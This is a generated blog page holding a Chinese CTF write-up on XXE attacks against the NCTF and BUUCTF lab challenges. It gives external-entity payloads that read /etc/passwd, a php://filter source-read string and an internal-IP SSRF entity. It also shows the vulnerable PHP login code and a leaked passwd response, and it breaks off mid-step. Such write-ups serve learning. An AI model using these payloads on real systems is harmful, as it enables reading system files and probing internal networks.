@@ -1,0 +1,706 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="顺便记录一下常用的linux文件路径，以便抄作业 开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!! fake_xml NCTF这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作 常用php伪协议:file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe攻击(2)">
+<meta property="og:url" content="http://example.com/2022/02/11/xxe%E6%94%BB%E5%87%BB(2)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="顺便记录一下常用的linux文件路径，以便抄作业 开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!! fake_xml NCTF这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作 常用php伪协议:file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTT">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-11T15:41:02.000Z">
+<meta property="article:modified_time" content="2022-04-17T05:40:56.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>xxe攻击(2) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xxe攻击(2)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-11 23:41" pubdate>
+          February 11, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xxe攻击(2)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>顺便记录一下常用的linux文件路径，以便抄作业</p>
+<p>开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!!</p>
+<h1 id="fake-xml-NCTF"><a href="#fake-xml-NCTF" class="headerlink" title="fake_xml NCTF"></a>fake_xml NCTF</h1><p>这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作</p>
+<p>常用php伪协议:<br>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — Secure Shell 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流</p>
+<p>(目前会用的也8多，只有file:&#x2F;&#x2F;和php:&#x2F;&#x2F;，以后慢慢填)<br>data:&#x2F;&#x2F;: 写入协议，比如创建text文件并向text文件写入welecome to the zjctf<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
+<p>首先，进入网页是个登陆界面，于是随便输，然后抓包，发现账户名和密码是以xml形式传输—-</p>
+<p>于是就阔以进行构造payload: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后因为file:&#x2F;&#x2F; 读不出来，就用了php:&#x2F;&#x2F;filter过滤函数    —-基操<br>base64转码获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();   <span class="hljs-comment">//设立对象</span><br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);  <span class="hljs-comment">//8管了</span><br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);    <span class="hljs-comment">//simplexml_import_dom: 把节点转化为对象----</span><br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<h1 id="more-linux下的-etc-passwd以及类似文件解释"><a href="#more-linux下的-etc-passwd以及类似文件解释" class="headerlink" title="more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释"></a>more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释</h1><p>在Linux &#x2F;etc&#x2F;passwd文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p>
+<p>哦，好了，我大致明白怎么工作了</p>
+<p>类似还有etc&#x2F;hosts文件等<br>类似还有!! &#x2F;proc&#x2F;net&#x2F;arp  —-8知道啥用，可以获得ip，和hosts一样，好像是用来内网渗透的<br>&#x2F;proc&#x2F;net&#x2F;fib_trie<br>eg: 169.254.1.1</p>
+<p>然后….<br>命令：SYSTEM “<a target="_blank" rel="noopener" href="http://169.254.1.1或https//169.254.1.1">http://169.254.1.1或https://169.254.1.1</a>“</p>
+<h1 id="payload作业"><a href="#payload作业" class="headerlink" title="payload作业"></a>payload作业</h1><p>放个典型:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br>php://filter/convert.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure>
+
+<h1 id="ture-xml-buuctf"><a href="#ture-xml-buuctf" class="headerlink" title="ture_xml(buuctf)"></a>ture_xml(buuctf)</h1><p>ok…….<br>首先进去是登陆界面，随便填，抓包</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /doLogin.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">97</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">97</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/xml, text/xml, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/xml;charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">66</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span>/<br><br><span class="hljs-section">&lt;user&gt;</span><span class="hljs-section">&lt;username&gt;</span><span class="hljs-attribute">admin</span>&lt;/username&gt;&lt;password&gt;<span class="hljs-number">123456</span>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+<p>可以看到username和password都是用xml传的</p>
+<p>所以就构造payload，直接抄作业</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>回显成功:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:32:58 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>968<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-ruby">&lt;result&gt;&lt;code&gt;<span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/code&gt;&lt;msg&gt;root:x:0:0:root:/root</span><span class="hljs-symbol">:/bin/bash</span></span><br><span class="language-ruby"><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span></span><br><span class="language-ruby"><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">&lt;<span class="hljs-regexp">/msg&gt;&lt;/result</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>那这一串有啥用捏？好像没啥用，那就再读读其他文件: proc&#x2F;net&#x2F;arp</p>
+<p>回显:</p>
